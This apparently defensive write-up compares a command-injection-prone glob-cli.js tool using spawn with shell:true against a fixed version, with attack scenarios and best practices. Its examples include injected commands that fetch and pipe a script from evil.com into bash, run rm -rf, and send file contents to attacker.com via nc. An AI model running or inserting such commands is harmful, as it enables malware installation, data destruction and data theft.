# Command Injection Vulnerability: Before and After

## Overview

This document provides a side-by-side comparison of the vulnerable and fixed code to clearly illustrate the security issue and its resolution.

## The Vulnerable Code (glob-cli.js)

### Key Issue: Using `shell: true`

```javascript
// In glob-cli.js (VULNERABLE)
const command = options.cmd.replace('{}', file);

const child = spawn(command, {
  shell: true,  // ⚠️ DANGEROUS: Enables shell interpretation
  stdio: 'inherit'
});
```

### Why This Is Dangerous

When `shell: true` is used:
1. The entire command string is passed to a system shell (`/bin/sh` or `cmd.exe`)
2. The shell interprets special characters and metacharacters
3. An attacker can chain commands using `;`, `&&`, `||`, `|`, etc.
4. Command substitution with `` ` `` or `$()` is possible
5. File redirection with `>`, `>>`, `<` works

### Attack Example

```bash
# User provides this command:
-c "cat {} ; rm -rf /tmp/important ; wget http://evil.com/malware.sh -O - | bash"

# With shell:true, the shell executes:
cat file1.txt ; rm -rf /tmp/important ; wget http://evil.com/malware.sh -O - | bash
                ^                       ^
                |                       Downloads and executes malware
                Deletes important files
```

## The Fixed Code (glob-cli-fixed.js)

### Key Fix: Remove `shell: true` and Parse Arguments

```javascript
// In glob-cli-fixed.js (SECURE)
const cmdParts = options.cmd.split(/\s+/);
const executable = cmdParts[0];
const args = cmdParts.slice(1).map(arg => arg.replace('{}', file));

const child = spawn(executable, args, {
  // No shell: true - executes directly
  stdio: 'inherit'
});
```

### Why This Is Secure

Without `shell: true`:
1. Commands are executed directly without shell interpretation
2. Special characters are treated as literal arguments
3. No command chaining is possible
4. No command substitution works
5. File redirection operators become literal strings

### Attack Blocked

```bash
# User provides the same malicious command:
-c "cat {} ; rm -rf /tmp/important"

# Without shell:true, this tries to execute:
cat ["file1.txt", ";", "rm", "-rf", "/tmp/important"]
     ^                ^
     |                These become arguments to 'cat', not separate commands
     The file to read

# Result: 'cat' fails because ";" is not a valid file
cat: ';': No such file or directory
```

## Detailed Comparison

| Aspect | Vulnerable Version | Fixed Version |
|--------|-------------------|---------------|
| **Command Parsing** | String passed to shell | Parsed into executable + args array |
| **Shell Invocation** | Yes (`shell: true`) | No |
| **Metacharacter Handling** | Interpreted by shell | Treated as literals |
| **Command Chaining** | Possible (`;`, `&&`, etc.) | Blocked |
| **Command Substitution** | Possible (`` ` ``, `$()`) | Blocked |
| **File Redirection** | Possible (`>`, `<`) | Blocked |
| **Execution Safety** | Unsafe - arbitrary commands | Safe - only specified executable |

## Code Flow Comparison

### Vulnerable Flow

```
User Input: "cat {} ; rm -rf /"
     ↓
Replace {} with filename
     ↓
String: "cat file.txt ; rm -rf /"
     ↓
Pass to spawn() with shell:true
     ↓
Shell interprets entire string
     ↓
Executes: cat file.txt
Then executes: rm -rf /  ⚠️ DANGEROUS!
```

### Secure Flow

```
User Input: "cat {} ; rm -rf /"
     ↓
Split into parts: ["cat", "{}", ";", "rm", "-rf", "/"]
     ↓
Replace {} in each part: ["cat", "file.txt", ";", "rm", "-rf", "/"]
     ↓
Executable: "cat"
Arguments: ["file.txt", ";", "rm", "-rf", "/"]
     ↓
Pass to spawn() without shell
     ↓
Direct execution (no shell)
     ↓
Tries: cat file.txt ";" "rm" "-rf" "/"
Result: Fails with "No such file" for ";" ✓ SAFE!
```

## Example Scenarios

### Scenario 1: Normal Usage

Both versions work correctly:

```bash
# Command:
./glob-cli.js "*.txt" -c "cat {}"

# Vulnerable version: ✓ Works (displays file contents)
# Fixed version: ✓ Works (displays file contents)
```

### Scenario 2: Command Injection Attack

```bash
# Command:
./glob-cli.js "*.txt" -c "cat {} ; echo HACKED > /tmp/pwned"

# Vulnerable version: ✗ SECURITY BREACH
# - Displays file contents
# - Creates /tmp/pwned with "HACKED"
# - Attack succeeds!

# Fixed version: ✓ SECURE
# - Tries to execute: cat file.txt ";" "echo" "HACKED" ">" "/tmp/pwned"
# - Fails with error (no file named ";")
# - Attack blocked!
```

### Scenario 3: Data Exfiltration Attempt

```bash
# Command:
./glob-cli.js "*.txt" -c "cat {} | nc attacker.com 4444"

# Vulnerable version: ✗ SECURITY BREACH
# - Sends file contents to attacker's server
# - Pipe operator works
# - Data exfiltrated!

# Fixed version: ✓ SECURE
# - Tries to execute: cat file.txt "|" "nc" "attacker.com" "4444"
# - Fails with error (no file named "|")
# - Attack blocked!
```

## Key Takeaway

The vulnerability exists because `shell: true` delegates command execution to a system shell, which interprets special characters. The fix removes shell interpretation by executing commands directly, making special characters harmless.

## Best Practice

**Never use `shell: true` with user-controlled input.**

```javascript
// ❌ NEVER DO THIS:
spawn(userInput, { shell: true });

// ✅ DO THIS INSTEAD:
const [cmd, ...args] = userInput.split(' ');
spawn(cmd, args);  // No shell:true

// ✅ EVEN BETTER (with validation):
const allowedCommands = ['cat', 'ls', 'grep'];
if (allowedCommands.includes(cmd)) {
  spawn(cmd, args);
}
```
